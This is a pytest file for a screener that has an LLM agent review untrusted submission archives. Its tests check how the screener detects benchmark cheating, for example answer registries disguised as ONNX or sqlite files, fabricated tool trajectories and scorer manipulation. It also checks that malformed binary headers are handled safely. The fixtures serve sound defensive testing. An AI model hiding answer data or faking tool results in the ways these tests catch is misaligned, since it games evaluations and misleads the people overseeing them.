"""Agentic source-review controls for untrusted submission crates."""

from __future__ import annotations

import asyncio
import hashlib
import io
import json
import logging
import os
import sqlite3
import struct
import tarfile
import zipfile
from pathlib import Path
from typing import IO, Any

import httpx
import pytest

from ditto_screener import binary_analysis as binary_analysis_module
from ditto_screener import source_review as source_review_module
from ditto_screener.binary_analysis import BinarySample
from ditto_screener.source_reachability import ReachabilityState, analyze_reachability
from ditto_screener.source_review import (
    OpenRouterSourceReviewAgent,
    TarSourceRepository,
    ledger_disposition,
)
from ditto_screener.source_signals import (
    find_decisive_malicious_source,
    find_source_review_leads,
)
from ditto_screening_protocol import (
    SCREENING_POLICY_VERSION,
    SourceReviewFinding,
    SourceReviewInvariant,
    SourceReviewInvariantDisposition,
)
from ditto_screening_protocol.review_ledger import substantiated_concern_count
from scripts.generate_starter_provenance import (
    RUNTIME_MANIFESTS,
    STAGED_MANIFESTS,
    manifests_in,
    newest_manifest,
    starter_files,
)

_SHA = "ab" * 32
_STARTER_KIT = Path(__file__).resolve().parents[3] / "miners" / "dittobench-starter-kit"
_STARTER_MANIFESTS = tuple(
    str(path)
    for path in sorted(
        (Path(source_review_module.__file__).parent / "data").glob(
            "starter-kit-provenance-*.json"
        )
    )
)

_PASS_CLAUSES = {
    "i1_model_invocation": "genuine_model_result",
    "i2_evidence_retention": "full_records_on_deciding_turn",
    "i3_model_dissent": "model_dissent_preserved",
    "i4_derived_value_authority": "no_derived_value",
    "i5_production_engine": "no_family_compiler",
    "i6_tool_execution_fidelity": "no_reported_tool_calls",
    "i7_model_tool_planning": "no_tool_planning",
    "i8_evaluation_independence": "evaluation_independent_runtime",
}
_INVARIANT_FOR_CATEGORY = {
    "benchmark_emulation": "i5_production_engine",
    "scorer_contract_manipulation": "i3_model_dissent",
    "fabricated_tool_trajectory": "i6_tool_execution_fidelity",
}


def test_static_policy_v10_assessment_retains_each_independent_breach() -> None:
    assessment = source_review_module.policy_v10_static_assessment(
        breaches={
            SourceReviewInvariant.PRODUCTION_ENGINE: [0, 1],
            SourceReviewInvariant.TOOL_EXECUTION_FIDELITY: [2],
        }
    )
    decisions = {decision.invariant: decision for decision in assessment.decisions}

    assert decisions[SourceReviewInvariant.PRODUCTION_ENGINE].disposition == (
        SourceReviewInvariantDisposition.BREACH
    )
    assert decisions[SourceReviewInvariant.PRODUCTION_ENGINE].evidence_indices == [
        0,
        1,
    ]
    assert (
        decisions[SourceReviewInvariant.TOOL_EXECUTION_FIDELITY].disposition
        == SourceReviewInvariantDisposition.BREACH
    )
    assert decisions[
        SourceReviewInvariant.TOOL_EXECUTION_FIDELITY
    ].evidence_indices == [2]
    assert decisions[SourceReviewInvariant.MODEL_INVOCATION].disposition == (
        SourceReviewInvariantDisposition.INCONCLUSIVE
    )
    assert decisions[SourceReviewInvariant.MODEL_INVOCATION].pass_clause is None


@pytest.mark.parametrize(
    ("match", "expected"),
    [
        (
            {
                "kind": "authoritative-derived-candidate",
                "category": "benchmark_emulation",
            },
            SourceReviewInvariant.DERIVED_VALUE_AUTHORITY,
        ),
        (
            {"kind": "predetermined-tool-plan", "category": "benchmark_emulation"},
            SourceReviewInvariant.MODEL_TOOL_PLANNING,
        ),
        (
            {
                "kind": "any",
                "category": "benchmark_emulation",
                "resolution_basis": "benchmark_answer_replacement",
            },
            SourceReviewInvariant.PRODUCTION_ENGINE,
        ),
    ],
)
def test_static_match_maps_to_the_invariant_it_actually_assesses(
    match: dict[str, object], expected: SourceReviewInvariant
) -> None:
    assert source_review_module._static_match_invariant(match) == expected


def _with_policy_v10_invariants(
    review: dict[str, object],
) -> dict[str, object]:
    if "invariants" in review:
        return review
    categories = set(review.get("categories", []))
    evidence = review.get("evidence", [])
    assert isinstance(evidence, list)
    breaches = {
        invariant: category
        for category, invariant in _INVARIANT_FOR_CATEGORY.items()
        if category in categories
    }
    decisions: list[dict[str, object]] = []
    for invariant, pass_clause in _PASS_CLAUSES.items():
        category = breaches.get(invariant)
        if category is None:
            decisions.append(
                {
                    "invariant": invariant,
                    "disposition": "pass",
                    "pass_clause": pass_clause,
                    "summary": "The reviewed path satisfies the published pass clause.",
                    "evidence_indices": [],
                }
            )
            continue
        decisions.append(
            {
                "invariant": invariant,
                "disposition": "breach",
                "pass_clause": None,
                "summary": (
                    "The reviewed path retains a reachable strict-policy breach."
                ),
                "evidence_indices": [
                    index
                    for index, item in enumerate(evidence)
                    if isinstance(item, dict) and item.get("category") == category
                ],
            }
        )
    return {**review, "invariants": decisions}


_BENIGN_REVIEW: dict[str, object] = {
    "risk_level": "low",
    "confidence": 0.9,
    "categories": ["none"],
    "evidence": [],
    "summary": "General model-backed request path.",
}


def test_pass_invariant_evidence_is_dropped_before_strict_validation() -> None:
    review = _with_policy_v10_invariants(_BENIGN_REVIEW)
    decisions = review["invariants"]
    assert isinstance(decisions, list)
    for decision in decisions[:5]:
        assert isinstance(decision, dict)
        decision["evidence_indices"] = [0]

    assessment = source_review_module._validated_invariant_assessment(
        decisions,
        submitted_evidence=[
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"}
        ],
        finding_evidence=[
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"}
        ],
        demoted_to_low=False,
        policy_version=13,
    )

    assert all(
        decision.evidence_indices == []
        for decision in assessment.decisions
        if decision.disposition == SourceReviewInvariantDisposition.PASS
    )


def _archive(tmp_path: Path, source: str) -> Path:
    path = tmp_path / "agent.tar.gz"
    with tarfile.open(path, "w:gz") as archive:
        for name, value in {
            "Cargo.toml": '[package]\nname="agent"\nversion="0.1.0"\n',
            "Dockerfile": "FROM scratch\n",
            "src/main.rs": source,
        }.items():
            raw = value.encode()
            member = tarfile.TarInfo(name)
            member.size = len(raw)
            archive.addfile(member, io.BytesIO(raw))
    return path


def _archive_files(tmp_path: Path, files: dict[str, bytes]) -> Path:
    path = tmp_path / "files.tar.gz"
    with tarfile.open(path, "w:gz") as archive:
        for name, raw in files.items():
            member = tarfile.TarInfo(name)
            member.size = len(raw)
            archive.addfile(member, io.BytesIO(raw))
    return path


def _tool(call_id: str, name: str, arguments: dict[str, object]) -> dict[str, object]:
    if name == "submit_review":
        arguments = _with_policy_v10_invariants(arguments)
    return {
        "id": call_id,
        "type": "function",
        "function": {"name": name, "arguments": json.dumps(arguments)},
    }


def _transport(final: dict[str, object], seen: list[dict[str, object]]):
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        payload = json.loads(request.content)
        seen.append(payload)
        assert request.headers["authorization"] == "Bearer sk-test-private-review"
        assert request.headers["http-referer"] == "https://heyditto.ai"
        assert request.headers["x-openrouter-title"] == "Ditto"
        if calls == 0:
            tool_calls = [
                _tool(
                    "read-1",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 400},
                ),
                _tool("search-1", "search", {"query": "call_model"}),
            ]
        else:
            tool_calls = [_tool("submit-1", "submit_review", final)]
        calls += 1
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    return httpx.MockTransport(handler)


def _agent(
    key_file: Path, transport: httpx.AsyncBaseTransport
) -> OpenRouterSourceReviewAgent:
    return OpenRouterSourceReviewAgent(
        api_key_file=str(key_file),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=4,
        transport=transport,
        transport_retry_delays=(0, 0),
    )


async def test_last_source_review_turn_requires_the_final_verdict_tool(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    final = _with_policy_v10_invariants(_BENIGN_REVIEW)

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(json.loads(request.content))
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "tool_calls": [_tool("submit", "submit_review", final)],
                        }
                    }
                ]
            },
        )

    agent = OpenRouterSourceReviewAgent(
        api_key_file=str(key),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=1,
        transport=httpx.MockTransport(handler),
    )
    observation = await agent.review(
        str(_archive(tmp_path, "fn main() {}")), artifact_sha256=_SHA
    )

    assert observation.ok
    assert seen[0]["tool_choice"] == "required"
    assert [tool["function"]["name"] for tool in seen[0]["tools"]] == ["submit_review"]


async def test_invalid_final_pass_clause_is_corrected_in_same_review(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    valid = _with_policy_v10_invariants(_BENIGN_REVIEW)
    invalid = json.loads(json.dumps(valid))
    invalid["invariants"][0]["pass_clause"] = "no_tool_planning"

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(json.loads(request.content))
        if len(seen) == 1:
            calls = [
                _tool(
                    "read-1",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 20},
                ),
                _tool("search-1", "search", {"query": "call_model"}),
            ]
        else:
            calls = [
                _tool(
                    f"submit-{len(seen)}",
                    "submit_review",
                    invalid if len(seen) == 2 else valid,
                )
            ]
        return httpx.Response(
            200,
            json={"choices": [{"message": {"role": "assistant", "tool_calls": calls}}]},
        )

    agent = OpenRouterSourceReviewAgent(
        api_key_file=str(key),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=2,
        transport=httpx.MockTransport(handler),
    )
    observation = await agent.review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert len(seen) == 3  # One schema repair is available after the final turn.
    feedback = json.loads(seen[2]["messages"][-2]["content"])
    assert feedback["field"] == "invariants[0].pass_clause"
    assert feedback["invariant"] == "i1_model_invocation"
    assert feedback["correctable"] is True
    assert "no_tool_planning" not in json.dumps(feedback)


def _archive_with(tmp_path: Path, extra: dict[str, bytes]) -> Path:
    path = tmp_path / "agent.tar.gz"
    with tarfile.open(path, "w:gz") as archive:
        base = {
            "Cargo.toml": b'[package]\nname="agent"\nversion="0.1.0"\n',
            "Dockerfile": b"FROM scratch\n",
            "src/main.rs": b"fn main() {}\n",
        }
        base.update(extra)
        for name, raw in base.items():
            member = tarfile.TarInfo(name)
            member.size = len(raw)
            archive.addfile(member, io.BytesIO(raw))
    return path


def _varint(value: int) -> bytes:
    encoded = bytearray()
    while value > 0x7F:
        encoded.append((value & 0x7F) | 0x80)
        value >>= 7
    encoded.append(value)
    return bytes(encoded)


def _pb_varint(field: int, value: int) -> bytes:
    return _varint(field << 3) + _varint(value)


def _pb_bytes(field: int, value: bytes) -> bytes:
    return _varint((field << 3) | 2) + _varint(len(value)) + value


def _minimal_onnx() -> bytes:
    # ONNX ModelProto -> GraphProto -> NodeProto/TensorProto/ValueInfoProto.
    node = _pb_bytes(4, b"MatMul")
    tensor = (
        _pb_varint(2, 1)
        + _pb_bytes(8, b"reranker.weight")
        + _pb_bytes(9, b"\x00\xff\x02\x03")
    )
    value_info = _pb_bytes(1, b"embedding")
    graph = b"".join(
        [
            _pb_bytes(1, node),
            _pb_bytes(2, b"reranker"),
            _pb_bytes(5, tensor),
            _pb_bytes(11, value_info),
            _pb_bytes(12, value_info),
        ]
    )
    opset = _pb_bytes(1, b"") + _pb_varint(2, 18)
    return _pb_varint(1, 9) + _pb_bytes(7, graph) + _pb_bytes(8, opset)


def test_opaque_binary_blob_is_surfaced_in_inventory(tmp_path: Path) -> None:
    blob = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00secret-string-table\x00" * 8
    repo = TarSourceRepository(str(_archive_with(tmp_path, {"assets/table.bin": blob})))
    inventory = json.loads(repo.inventory())
    opaque = {entry["path"]: entry for entry in inventory["opaque_blobs"]}
    assert "assets/table.bin" in opaque
    assert opaque["assets/table.bin"]["reason"] == "non_utf8"
    assert opaque["assets/table.bin"]["bytes"] == len(blob)
    # A normal UTF-8 source file is not surfaced as opaque.
    assert "src/main.rs" not in opaque


def test_valid_onnx_is_structurally_analyzed_without_extension_trust(
    tmp_path: Path,
) -> None:
    model = _minimal_onnx()
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/reranker.bin": model}))
    )

    inventory = json.loads(repo.inventory())
    assert [item["path"] for item in inventory["opaque_blobs"]] == [
        "models/reranker.bin"
    ]
    assert inventory["binary_analysis"][0]["path"] == "models/reranker.bin"
    assert inventory["binary_analysis"][0]["format"] == "onnx"
    assert inventory["binary_analysis"][0]["details"]["operator_types"] == ["MatMul"]
    analysis = json.loads(repo.analyze_binary("models/reranker.bin"))

    assert analysis["format"] == "onnx"
    assert analysis["format_confidence"] == "high"
    assert analysis["details"]["graph_complete"] is True
    assert analysis["details"]["graph_parse_status"] == "complete"
    assert analysis["details"]["graph_name"] == "reranker"
    assert analysis["details"]["ir_version"] == 9
    assert analysis["details"]["node_count"] == 1
    assert analysis["details"]["initializer_count"] == 1
    assert analysis["details"]["initializer_bytes"] == 4
    assert analysis["details"]["input_count"] == 1
    assert analysis["details"]["output_count"] == 1
    assert analysis["details"]["operator_types"] == ["MatMul"]
    assert analysis["details"]["opsets"] == [{"domain": "", "version": 18}]
    assert analysis["details"]["external_data_references"] == 0
    assert analysis["details"]["metadata_complete"] is True
    assert analysis["details"]["model_parse_status"] == "complete"
    assert analysis["benchmark_schema_markers"] == []
    assert analysis["safety"] == {
        "decompressed_payloads": False,
        "executed": False,
        "external_data_loaded": False,
    }


def test_onnx_suffix_does_not_hide_renamed_answer_registry(tmp_path: Path) -> None:
    registry = (
        b"\xff\x00expected_answer\x00answer_items\x00forbidden_answer\x00"
        b"memory_cases\x00run_after_wave\x00tool_cases\x00"
    )
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/answers.onnx": registry}))
    )

    analysis = json.loads(repo.analyze_binary("models/answers.onnx"))

    assert analysis["format"] == "binary-data"
    assert analysis["benchmark_schema_markers"] == [
        "answer_items",
        "expected_answer",
        "forbidden_answer",
        "memory_cases",
        "run_after_wave",
        "tool_cases",
    ]
    inventory = json.loads(repo.inventory())
    assert any(
        item["path"] == "models/answers.onnx" for item in inventory["opaque_blobs"]
    )
    assert inventory["binary_analysis"][0]["format"] == "binary-data"
    assert inventory["binary_analysis"][0]["benchmark_schema_markers"] == [
        "answer_items",
        "expected_answer",
        "forbidden_answer",
        "memory_cases",
        "run_after_wave",
        "tool_cases",
    ]


def test_analyze_binary_reports_executable_and_archive_structure(
    tmp_path: Path,
) -> None:
    elf = bytearray(64)
    elf[:7] = b"\x7fELF\x02\x01\x01"
    elf[16:20] = struct.pack("<HH", 2, 62)
    elf[24:32] = struct.pack("<Q", 0x401000)
    archive_buffer = io.BytesIO()
    with zipfile.ZipFile(archive_buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("dataset/memory_cases.json", b'{"expected_answer":"x"}')

    repo = TarSourceRepository(
        str(
            _archive_with(
                tmp_path,
                {
                    "bin/agent": bytes(elf),
                    "fixtures/public-dataset.zip": archive_buffer.getvalue(),
                },
            )
        )
    )

    executable = json.loads(repo.analyze_binary("bin/agent"))
    bundled = json.loads(repo.analyze_binary("fixtures/public-dataset.zip"))

    assert executable["format"] == "elf"
    assert executable["details"] == {
        "bits": 64,
        "byte_order": "little",
        "entrypoint": 0x401000,
        "machine": 62,
        "os_abi": 0,
        "type": 2,
    }
    assert bundled["format"] == "zip"
    assert bundled["details"]["entry_count"] == 1
    assert bundled["details"]["entries"][0]["path"] == ("dataset/memory_cases.json")
    assert bundled["safety"]["decompressed_payloads"] is False


def test_analyze_binary_reports_safetensors_without_loading_weights(
    tmp_path: Path,
) -> None:
    header = json.dumps(
        {
            "reranker.weight": {
                "dtype": "F32",
                "shape": [2, 2],
                "data_offsets": [0, 16],
            },
            "__metadata__": {"framework": "competition-reranker"},
        },
        separators=(",", ":"),
    ).encode()
    model = len(header).to_bytes(8, "little") + header + b"\xff" * 16
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/reranker.weights": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/reranker.weights"))

    assert analysis["format"] == "safetensors"
    assert analysis["details"]["tensor_count"] == 1
    assert analysis["details"]["tensor_bytes"] == 16
    assert analysis["details"]["tensors"] == [
        {
            "bytes": 16,
            "dtype": "F32",
            "name": "reranker.weight",
            "shape": [2, 2],
        }
    ]
    assert analysis["safety"]["external_data_loaded"] is False


@pytest.mark.parametrize(
    "header",
    [
        pytest.param(b"[" * 1_000_000 + b"]" * 1_000_000, id="deep-nesting"),
        pytest.param(
            b'{"weight":{"dtype":"U8","shape":[16],"data_offsets":[0,'
            + b"9" * 5000
            + b"]}}",
            id="huge-integer",
        ),
        pytest.param(b'{"weight":invalid}', id="invalid-json"),
        pytest.param(b"{\xff}", id="invalid-utf8"),
    ],
)
def test_safetensors_header_failure_is_contained(
    tmp_path: Path, header: bytes, monkeypatch: pytest.MonkeyPatch
) -> None:
    model = len(header).to_bytes(8, "little") + header + b"\xff" * 16
    marker = {
        "parse_status": "analysis-failed",
        "reason": "header-unparseable",
        "details_truncated": True,
    }
    assert binary_analysis_module._safetensors_details(model, False) == marker
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/hostile.weights": model}))
    )
    inventory = json.loads(repo.inventory())
    entry = inventory["binary_analysis"][0]
    assert entry["format"] == "safetensors"
    assert entry["format_confidence"] == "low"
    assert entry["analysis_failed"] is True
    assert entry["analysis_truncated"] is True
    assert entry["details"] == marker

    def unexpected_reparse(*_args: object, **_kwargs: object) -> None:
        pytest.fail("cached failure must not be parsed again")

    monkeypatch.setattr(source_review_module, "analyze_binary", unexpected_reparse)
    analysis = json.loads(repo.analyze_binary("models/hostile.weights"))
    assert analysis == repo._binary_analysis_cache["models/hostile.weights"]
    assert analysis["details"] == marker
    assert json.loads(repo.inventory()) == inventory


@pytest.mark.parametrize("failing_step", ["sample_stream", "analyze_binary"])
def test_inventory_survives_binary_analysis_exception(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
    failing_step: str,
) -> None:
    calls = 0

    def fail(*_args: object, **_kwargs: object) -> None:
        nonlocal calls
        calls += 1
        raise RuntimeError("attacker-controlled-exception-text")

    monkeypatch.setattr(source_review_module, failing_step, fail)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"data/blob.bin": b"\xff" * 16}))
    )
    inventory = repo.inventory()
    entry = json.loads(inventory)["binary_analysis"][0]
    assert entry["analysis_failed"] is True
    assert entry["analysis_truncated"] is True
    analysis = repo.analyze_binary("data/blob.bin")
    assert json.loads(analysis) == {
        "path": "data/blob.bin",
        "bytes": 16,
        "format": "unknown",
        "analysis_failed": True,
        "analysis_truncated": True,
        "error": "analysis-failed",
    }
    assert repo.inventory() == inventory
    assert repo.analyze_binary("data/blob.bin") == analysis
    assert calls == 1
    assert "RuntimeError" in caplog.text
    assert (
        "attacker-controlled-exception-text" not in inventory + analysis + caplog.text
    )
    assert all(record.exc_info is None for record in caplog.records)


def test_safetensors_rejects_invalid_and_overlapping_payload_ranges(
    tmp_path: Path,
) -> None:
    header = json.dumps(
        {
            "valid": {"dtype": "U8", "shape": [8], "data_offsets": [0, 8]},
            "negative": {"dtype": "U8", "shape": [1], "data_offsets": [-1, 0]},
            "descending": {
                "dtype": "U8",
                "shape": [1],
                "data_offsets": [9, 8],
            },
            "outside": {"dtype": "U8", "shape": [1], "data_offsets": [16, 17]},
            "overlap": {"dtype": "U8", "shape": [8], "data_offsets": [4, 12]},
            "boolean": {"dtype": "U8", "shape": [1], "data_offsets": [False, 1]},
        },
        separators=(",", ":"),
    ).encode()
    model = len(header).to_bytes(8, "little") + header + b"\xff" * 16
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/untrusted.weights": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/untrusted.weights"))

    assert analysis["format"] == "safetensors"
    assert analysis["format_confidence"] == "medium"
    assert analysis["details"]["tensor_count"] == 1
    assert analysis["details"]["tensor_bytes"] == 8
    assert analysis["details"]["invalid_tensor_ranges"] == 5
    assert analysis["details"]["payload_available"] is False


def test_safetensors_without_declared_payload_is_not_high_confidence(
    tmp_path: Path,
) -> None:
    header = json.dumps(
        {
            "missing": {
                "dtype": "F32",
                "shape": [2, 2],
                "data_offsets": [0, 16],
            }
        },
        separators=(",", ":"),
    ).encode()
    model = len(header).to_bytes(8, "little") + header
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/missing-payload.weights": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/missing-payload.weights"))

    assert analysis["format"] != "safetensors"
    assert analysis["format_confidence"] != "high"


def test_onnx_truncated_top_level_parse_is_partial(tmp_path: Path) -> None:
    model = _minimal_onnx() + _pb_varint(2, 128)[:-1]
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/truncated.onnx": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/truncated.onnx"))

    assert analysis["format"] == "onnx"
    assert analysis["format_confidence"] == "medium"
    assert analysis["details"]["model_parse_status"] == "truncated"
    assert analysis["details"]["metadata_complete"] is False


def test_onnx_field_cap_is_partial(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(binary_analysis_module, "_MAX_PROTO_FIELDS", 2)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/capped.onnx": _minimal_onnx()}))
    )

    analysis = json.loads(repo.analyze_binary("models/capped.onnx"))

    assert analysis["format"] == "onnx"
    assert analysis["format_confidence"] == "medium"
    assert analysis["details"]["model_parse_status"] == "field_limit"
    assert analysis["details"]["metadata_complete"] is False


def test_onnx_truncated_nested_graph_is_partial(tmp_path: Path) -> None:
    graph = _pb_bytes(1, _pb_bytes(4, b"MatMul")) + b"\x10\x80"
    model = _pb_varint(1, 9) + _pb_bytes(7, graph)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/partial-graph.onnx": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/partial-graph.onnx"))

    assert analysis["format"] == "onnx"
    assert analysis["format_confidence"] == "medium"
    assert analysis["details"]["graph_parse_status"] == "truncated"
    assert analysis["details"]["graph_complete"] is False
    assert analysis["details"]["metadata_complete"] is False


def test_analyze_binary_surfaces_datagen_schema_inside_sqlite(tmp_path: Path) -> None:
    database = tmp_path / "answers.db"
    connection = sqlite3.connect(database)
    connection.execute(
        "CREATE TABLE memory_cases "
        "(expected_answer TEXT, answer_items TEXT, forbidden_answer TEXT)"
    )
    connection.commit()
    connection.close()
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"cache/retrieval.db": database.read_bytes()}))
    )

    analysis = json.loads(repo.analyze_binary("cache/retrieval.db"))

    assert analysis["format"] == "sqlite3"
    assert analysis["details"]["page_size"] == 4096
    assert analysis["benchmark_schema_markers"] == [
        "answer_items",
        "expected_answer",
        "forbidden_answer",
        "memory_cases",
    ]


def test_analyze_binary_is_bounded_and_labels_partial_analysis(tmp_path: Path) -> None:
    oversized = b"\xff" + b"x" * (8 * 1024 * 1024 + 1)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/large.weights": oversized}))
    )

    analysis = json.loads(repo.analyze_binary("models/large.weights"))

    assert analysis["bytes"] == len(oversized)
    assert analysis["analyzed_bytes"] == 8 * 1024 * 1024
    assert analysis["analysis_truncated"] is True
    assert len(analysis["sha256"]) == 64
    assert analysis["sha256_complete"] is True
    assert analysis["sha256_bytes"] == len(oversized)


def test_binary_hashing_has_an_expanded_member_cap(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(binary_analysis_module, "_MAX_HASHED_BYTES", 16)

    sample = binary_analysis_module.sample_stream(io.BytesIO(b"x" * 64), size=64)
    analysis = binary_analysis_module.analyze_binary(sample, path="data/bomb.bin")

    assert sample.hashed_bytes == 16
    assert sample.hash_complete is False
    assert analysis["sha256_bytes"] == 16
    assert analysis["sha256_complete"] is False
    assert analysis["analysis_truncated"] is True


def test_analyze_binary_rejects_missing_member(tmp_path: Path) -> None:
    repo = TarSourceRepository(str(_archive_with(tmp_path, {})))
    assert json.loads(repo.analyze_binary("missing.onnx")) == {
        "error": "file-not-found"
    }


def test_inventory_preanalysis_is_reused_by_agent_tool(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls = 0
    original = source_review_module.sample_stream

    def counting_sample_stream(stream: IO[bytes], *, size: int) -> BinarySample:
        nonlocal calls
        calls += 1
        return original(stream, size=size)

    monkeypatch.setattr(source_review_module, "sample_stream", counting_sample_stream)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/reranker.onnx": _minimal_onnx()}))
    )

    inventory = json.loads(repo.inventory())
    detailed = json.loads(repo.analyze_binary("models/reranker.onnx"))

    assert inventory["binary_analysis"][0]["sha256"] == detailed["sha256"]
    assert calls == 1


def test_oversized_file_is_surfaced_as_opaque(tmp_path: Path) -> None:
    big = b"a" * (2 * 1024 * 1024 + 16)
    repo = TarSourceRepository(str(_archive_with(tmp_path, {"data/big.txt": big})))
    opaque = json.loads(repo.inventory())["opaque_blobs"]
    assert any(
        entry["path"] == "data/big.txt" and entry["reason"] == "oversized"
        for entry in opaque
    )


_STARTER_MODEL = "fixtures/models/cross-encoder.onnx"


def _stock_starter_model() -> bytes:
    kit = Path(__file__).resolve().parents[3] / "miners" / "dittobench-starter-kit"
    return (kit / _STARTER_MODEL).read_bytes()


def test_review_leads_account_for_exact_starter_model(tmp_path: Path) -> None:
    model = _stock_starter_model()
    repo = TarSourceRepository(str(_archive_with(tmp_path, {_STARTER_MODEL: model})))
    leads = repo.review_leads()
    assert leads["truncated"] is False
    assert leads["nontext"] == [
        {
            "path": _STARTER_MODEL,
            "bytes": len(model),
            "sha256": hashlib.sha256(model).hexdigest(),
            "provenance": "starter_manifest_digest",
        }
    ]


@pytest.mark.parametrize(
    ("path", "payload"),
    [
        ("models/cross-encoder.onnx", "stock"),
        (_STARTER_MODEL, "flipped"),
        (_STARTER_MODEL, "nul-prefixed"),
        ("assets/model.bin", "nul-prefixed"),
        ("src/table.rs", "text"),
    ],
)
def test_review_leads_keep_unproven_oversized_member_truncated(
    tmp_path: Path, path: str, payload: str
) -> None:
    flipped = bytearray(_stock_starter_model())
    flipped[-1] ^= 0x01
    raw = {
        "stock": _stock_starter_model(),
        "flipped": bytes(flipped),
        "nul-prefixed": b"\x00" + b"x" * (2 * 1024 * 1024),
        "text": b"answer\n" + b"x" * (2 * 1024 * 1024),
    }[payload]
    leads = TarSourceRepository(
        str(_archive_with(tmp_path, {path: raw}))
    ).review_leads()
    assert leads["truncated"] is True
    assert leads["nontext"] == []


def test_review_leads_need_installed_manifest_for_starter_model(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    empty = tmp_path / "no-manifests"
    empty.mkdir()
    monkeypatch.setattr(source_review_module, "_STARTER_MANIFEST_DIR", empty)
    leads = TarSourceRepository(
        str(_archive_with(tmp_path, {_STARTER_MODEL: _stock_starter_model()}))
    ).review_leads()
    assert leads["truncated"] is True
    assert leads["nontext"] == []


def _runtime_pinned_kit_source() -> tuple[str, bytes]:
    """A kit file a runtime manifest pins and the preflight scans on its own.

    ``malicious_preflight`` scans runtime paths, which leave out standalone
    shell scripts, so the helper uses the same rule and checks it on the
    one-file archive the tests build.
    """
    files = _current_starter_kit_files()
    for path in sorted(_exact_starter_matches(files, _STARTER_MANIFESTS)):
        if source_review_module.is_executable_source_path(
            path
        ) and not source_review_module._is_standalone_shell_script(path):
            return path, files[path]
    pytest.skip("no runtime manifest pins a current kit source file")


@pytest.mark.parametrize("level", ["repository", "call"])
def test_empty_manifest_override_trusts_nothing_in_review_leads(
    tmp_path: Path, level: str
) -> None:
    path, raw = _runtime_pinned_kit_source()
    archive = str(
        _archive_files(tmp_path, {path: raw, _STARTER_MODEL: _stock_starter_model()})
    )

    default = TarSourceRepository(archive).review_leads()
    empty = (
        TarSourceRepository(archive, provenance_manifest_paths=()).review_leads()
        if level == "repository"
        else TarSourceRepository(archive).review_leads(())
    )

    # None means the runtime set; an explicit empty set trusts nothing, for
    # the digest skip and for the oversized starter model alike.
    assert default["trusted_starter_skipped"] == 1
    assert default["truncated"] is False
    assert empty["trusted_starter_skipped"] == 0
    assert empty["truncated"] is True
    assert empty["nontext"] == []


@pytest.mark.parametrize("level", ["repository", "call"])
def test_empty_manifest_override_trusts_nothing_in_preflight(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, level: str
) -> None:
    path, raw = _runtime_pinned_kit_source()
    scanned: list[list[str]] = []

    def recording_detector(
        readable: list[tuple[str, str]], **kwargs: object
    ) -> list[dict[str, object]]:
        scanned.append([name for name, _text in readable])
        return find_decisive_malicious_source(readable, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(
        source_review_module, "find_decisive_malicious_source", recording_detector
    )
    archive = str(_archive_files(tmp_path, {path: raw}))
    assert path in TarSourceRepository(archive)._explicit_runtime_paths()

    TarSourceRepository(archive).malicious_preflight(artifact_sha256="a" * 64)
    if level == "repository":
        TarSourceRepository(archive, provenance_manifest_paths=()).malicious_preflight(
            artifact_sha256="a" * 64
        )
    else:
        TarSourceRepository(archive).malicious_preflight(
            artifact_sha256="a" * 64, provenance_manifest_paths=()
        )

    assert scanned == [[], [path]]


def _broken_manifest(tmp_path: Path, kind: str) -> str:
    if kind == "missing":
        return str(tmp_path / "missing-manifest.json")
    broken = tmp_path / "broken-manifest.json"
    broken.write_text("{not json")
    return str(broken)


